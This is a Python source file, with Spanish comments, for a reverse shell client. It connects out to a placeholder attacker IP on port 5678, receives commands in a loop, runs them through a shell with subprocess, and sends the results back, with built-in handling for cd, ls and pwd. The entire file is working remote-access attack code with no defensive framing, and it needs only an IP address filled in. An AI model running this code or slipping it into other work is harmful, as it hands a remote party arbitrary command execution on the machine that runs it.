import socket
import os
import subprocess

def shell():
    current_dir = os.getcwd()
    client.send(current_dir.encode('utf-8'))

    while True:
        res = client.recv(3000)
        command = res.decode('utf-8').strip()
        
        # Manejo de comandos cd
        if command.startswith("cd "):
            try:
                os.chdir(command[3:])
                result = os.getcwd()
                client.send(result.encode('utf-8'))
                current_dir = result
            except:
                client.send(b"Error: Directory not found")
        
        # Comandos específicos del sistema
        elif command == "ls" or command == "dir":
            try:
                files = os.listdir('.')
                result = '\n'.join(files)
                client.send(result.encode('utf-8'))
            except:
                client.send(b"Error listing directory")
        
        elif command == "pwd":
            result = os.getcwd()
            client.send(result.encode('utf-8'))
        
        # Otros comandos generales
        else:
            try:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout, stderr = proc.communicate()
                result = stdout + stderr
                print("Result: ", result)
                
                if len(result) == 0:
                    client.send(os.getcwd().encode('utf-8'))
                else:
                    client.send(result)
            except:
                client.send(b"Error executing command")

# Configuración de conexión saliente
def config():
    global client, ip, port
    
    ip = 'dirección ip (ifconfig)'
    port = 5678
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((ip, port))
    print(f"Connected to {ip}:{port}")
    
config()
shell()
client.close()